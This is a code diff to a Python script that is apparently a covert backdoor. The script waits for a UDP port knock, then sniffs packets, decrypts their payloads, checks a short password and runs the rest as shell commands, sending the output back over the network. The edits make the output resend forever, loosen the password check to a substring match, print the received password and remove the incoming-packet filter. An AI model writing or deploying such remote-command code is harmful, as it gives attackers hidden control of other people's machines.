@@ -56,19 +56,20 @@ def executeCmd(cmd):
     result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     result = result.stdout.read() + result.stderr.read()
     print("Result: %s" % result)
-    sendPacket(result)
-    time.sleep(0.1)
+    while True:
+        sendPacket(result)
+        time.sleep(3)
 
 def parsePacket(packet):
-    payload = packet[protocol].payload.load
+    payload = packet[protocol.upper()].payload.load
     payload = encryption.decrypt(payload)
 
     if payload == "":
         return
-    password = payload[:8]
-    cmd = payload[8:]
-
-    if password is not config.password:
+    password = str(payload[:8], 'utf8')
+    cmd = str(payload[8:], 'utf8')
+    print(password)
+    if password not in config.password:
         return
     executeCmd(cmd)
 
@@ -91,7 +92,7 @@ def is_incoming(packet):
     # Get the default hardware interface
     defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
     hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']
-
+    print("Incorrect hardware")
     return packet[Ether].src != hardwareAddr
 
 def main():
@@ -102,7 +103,7 @@ def main():
     while code != 3:
         sniff(filter="udp and dst port {}".format(listenPort), prn=portKnocking, count=1)
     while True:
-        sniff(lfilter=is_incoming, filter=mFilter, prn=parsePacket, count=1)
+        sniff(filter=mFilter, prn=parsePacket, count=1)
 
 if __name__ == '__main__':
     main()
